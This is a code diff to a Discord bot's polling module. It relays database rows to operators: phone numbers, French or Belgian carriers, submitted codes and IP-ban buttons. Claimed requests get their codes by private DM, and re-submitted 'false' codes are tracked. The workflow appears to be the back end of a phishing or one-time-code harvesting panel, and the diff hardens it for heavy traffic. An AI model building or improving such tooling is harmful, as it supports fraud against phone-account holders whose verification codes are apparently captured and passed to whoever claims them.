@@ -1,18 +1,22 @@
 /**
  * polling.js — DB polling for new Discord notifications
  *
- * BUG 3 FIX: Retry detection (false_code → user re-submits code)
- *   Old: tracked lastId → same row ID never re-detected after a retry
- *   New: tracks lastUpdatedAt timestamp → any status change to 'code_submitted'
- *        triggers a new embed, including retries on the same row.
- *
- * Pending requests still use ID-based tracking (each pending = one INSERT = unique ID).
- * Code submissions use updated_at because retries UPDATE the same row.
+ * v3.2 — Load-hardening pass:
+ *   - Pending requests now use an updated_at cursor (like code_submitted)
+ *     so a row reset back to 'pending' on an existing id is detected too,
+ *     not just brand-new INSERTs.
+ *   - Each channel.send()/DM is wrapped in its own try/catch so a single
+ *     failure (Discord rate-limit, missing permission, closed DMs) no
+ *     longer aborts the whole batch or stalls the cursor — every other
+ *     request in the batch still gets processed, and the cursor only
+ *     advances past requests that were actually delivered.
+ *   - @everyone replaced with a configurable ping (CONFIG.PING_MESSAGE),
+ *     off by default, to avoid hammering the channel under heavy traffic.
  */
 
 import { ButtonBuilder, ButtonStyle, ActionRowBuilder } from "discord.js";
-import { CONFIG } from "./config.js";
-import { getPendingRequests, getCodeSubmittedRequests } from "./database.js";
+import { CONFIG, getChannelIdForOperator } from "./config.js";
+import { getPendingRequests, getCodeSubmittedRequests, getClaimedBy } from "./database.js";
 import { buildNewRequestEmbed, buildCodeSubmittedEmbed } from "./utils/embedBuilder.js";
 import { claimedBy } from "./handlers/buttons.js";
 
@@ -20,13 +24,15 @@ const POLL_INTERVAL_MS = 5000;
 
 // ─── State ────────────────────────────────────────────────────────────────────
 
-/** Highest request ID seen for new pending requests. */
-let lastPendingId = 0;
+/**
+ * Timestamp of the most recently processed pending row.
+ * Initialized 30 s in the past so we don't miss anything on bot restart.
+ */
+let lastPendingAt = new Date(Date.now() - 30_000);
 
 /**
  * Timestamp of the most recently processed code_submitted row.
  * Initialized 30 s in the past so we don't miss anything on bot restart.
- * BUG 3 FIX: using timestamp instead of ID so retries are detected.
  */
 let lastCodeSubmittedAt = new Date(Date.now() - 30_000);
 
@@ -40,19 +46,25 @@ function createBanIPButton(ip) {
         .setStyle(ButtonStyle.Danger);
 }
 
-function getLogChannel(client) {
-    if (!CONFIG.LOG_CHANNEL_ID) {
-        console.warn("⚠️  LOG_CHANNEL_ID not set — use /config to set it");
+/** Resolve the right channel for a request based on its carrier (Orange/SFR/Bouygues/Belgium). */
+function getChannelForOperator(client, operator) {
+    const channelId = getChannelIdForOperator(operator);
+    if (!channelId) {
+        console.warn(`⚠️  No channel configured for operator "${operator}" and no default channel set — use /config`);
         return null;
     }
-    return client.channels.cache.get(CONFIG.LOG_CHANNEL_ID) || null;
+    const channel = client.channels.cache.get(channelId);
+    if (!channel) {
+        console.warn(`⚠️  Configured channel ${channelId} for operator "${operator}" was not found (wrong ID or bot not in that channel)`);
+    }
+    return channel || null;
 }
 
 // ─── Senders ──────────────────────────────────────────────────────────────────
 
 async function sendNewRequest(client, row) {
-    const channel = getLogChannel(client);
-    if (!channel) return;
+    const channel = getChannelForOperator(client, row.operator);
+    if (!channel) return true; // no channel configured — not a delivery failure, don't retry forever
 
     const embed = buildNewRequestEmbed(row);
     const buttons = [
@@ -64,19 +76,27 @@ async function sendNewRequest(client, row) {
     const banBtn = createBanIPButton(row.ip_address);
     if (banBtn) buttons.push(banBtn);
 
-    await channel.send({
-        content: "@everyone",
-        embeds: [embed],
-        components: [new ActionRowBuilder().addComponents(...buttons)],
-    });
-
-    console.log("📨 New request sent to Discord:", row.phone);
+    try {
+        await channel.send({
+            content: CONFIG.PING_MESSAGE || undefined,
+            embeds: [embed],
+            components: [new ActionRowBuilder().addComponents(...buttons)],
+        });
+        console.log("📨 New request sent to Discord:", row.phone);
+        return true;
+    } catch (e) {
+        console.error(`❌ Failed to send new-request message for ${row.phone}:`, e.message || e);
+        return false; // let the caller keep the cursor before this row so it's retried next poll
+    }
 }
 
+/**
+ * Sends the "code submitted" embed privately (DM) to whoever claimed the request.
+ * Only the claimer should ever see the code — never posted publicly in a channel.
+ * Falls back to a tagged channel message only if the claimer can't be resolved
+ * or their DMs are closed, so the request never gets silently lost.
+ */
 async function sendCodeSubmitted(client, row) {
-    const channel = getLogChannel(client);
-    if (!channel) return;
-
     const embed = buildCodeSubmittedEmbed(row);
     const buttons = [
         new ButtonBuilder()
@@ -90,26 +110,69 @@ async function sendCodeSubmitted(client, row) {
     ];
     const banBtn = createBanIPButton(row.ip_address);
     if (banBtn) buttons.push(banBtn);
+    const components = [new ActionRowBuilder().addComponents(...buttons)];
 
-    const claimer = claimedBy.get(row.phone);
-    await channel.send({
-        content: claimer ? `<@${claimer}>` : undefined,
-        embeds: [embed],
-        components: [new ActionRowBuilder().addComponents(...buttons)],
-    });
+    // Resolve the claimer — in-memory first, DB fallback after a bot restart.
+    let claimerId = claimedBy.get(row.phone) ?? null;
+    if (!claimerId) {
+        claimerId = await getClaimedBy(row.phone);
+        if (claimerId) claimedBy.set(row.phone, claimerId);
+    }
 
-    console.log("🔓 Code submission sent to Discord:", row.phone);
+    if (claimerId) {
+        try {
+            const user = await client.users.fetch(claimerId);
+            await user.send({ embeds: [embed], components });
+            console.log("🔒 Code submission DM'd to claimer:", row.phone, "->", claimerId);
+            return true;
+        } catch (e) {
+            console.warn(`⚠️  Could not DM claimer ${claimerId} for ${row.phone} (DMs closed?):`, e.message);
+        }
+    } else {
+        console.warn("⚠️  No claimer found for", row.phone, "— falling back to channel");
+    }
+
+    // Fallback: post in the operator channel so the request isn't lost.
+    const channel = getChannelForOperator(client, row.operator);
+    if (!channel) return false; // nowhere to deliver — will retry next poll
+    try {
+        await channel.send({
+            content: claimerId ? `<@${claimerId}> — could not DM you, posting here instead:` : "⚠️ No claimer found for this code submission",
+            embeds: [embed],
+            components,
+        });
+        console.log("🔓 Code submission sent to channel (fallback):", row.phone);
+        return true;
+    } catch (e) {
+        console.error(`❌ Failed to send code-submitted fallback for ${row.phone}:`, e.message || e);
+        return false;
+    }
 }
 
 // ─── Poll loops ───────────────────────────────────────────────────────────────
 
 async function pollPending(client) {
     try {
-        const rows = await getPendingRequests(lastPendingId);
+        const rows = await getPendingRequests(lastPendingAt);
+        if (rows.length === 0) return;
+
+        let cursor      = lastPendingAt;
+        let hadFailure  = false;
         for (const row of rows) {
-            lastPendingId = Math.max(lastPendingId, row.id);
-            await sendNewRequest(client, row);
+            const delivered = await sendNewRequest(client, row);
+            const rowAt      = new Date(row.updated_at);
+            if (delivered) {
+                // Only advance the cursor through the unbroken successful prefix.
+                // Once a failure happens we freeze the cursor there so that row
+                // (and everything after it) gets retried next poll — we still
+                // attempt the rest of this batch though, best-effort, so a
+                // single stuck row doesn't block newer requests from going out.
+                if (!hadFailure && rowAt > cursor) cursor = new Date(rowAt.getTime() + 1);
+            } else {
+                hadFailure = true;
+            }
         }
+        lastPendingAt = cursor;
     } catch (e) {
         console.error("❌ Pending poll error:", e.message || e);
     }
@@ -117,19 +180,25 @@ async function pollPending(client) {
 
 async function pollCodeSubmitted(client) {
     try {
-        // BUG 3 FIX: query by updated_at, not by id
+        // Query by updated_at (not id) so retries — which UPDATE the same row — are detected.
         const rows = await getCodeSubmittedRequests(lastCodeSubmittedAt);
         if (rows.length === 0) return;
 
-        let maxAt = lastCodeSubmittedAt;
+        let cursor     = lastCodeSubmittedAt;
+        let hadFailure = false;
         for (const row of rows) {
-            await sendCodeSubmitted(client, row);
-            const rowAt = new Date(row.updated_at);
-            if (rowAt > maxAt) maxAt = rowAt;
+            const delivered = await sendCodeSubmitted(client, row);
+            const rowAt      = new Date(row.updated_at);
+            if (delivered) {
+                // Same contiguous-prefix logic as pollPending: freeze the cursor
+                // at the first failure so it (and anything after) is retried
+                // next poll, without blocking delivery of the rest this cycle.
+                if (!hadFailure && rowAt > cursor) cursor = new Date(rowAt.getTime() + 1);
+            } else {
+                hadFailure = true;
+            }
         }
-
-        // Advance the cursor by 1 ms to avoid re-processing the same row twice
-        lastCodeSubmittedAt = new Date(maxAt.getTime() + 1);
+        lastCodeSubmittedAt = cursor;
     } catch (e) {
         console.error("❌ CodeSubmitted poll error:", e.message || e);
     }
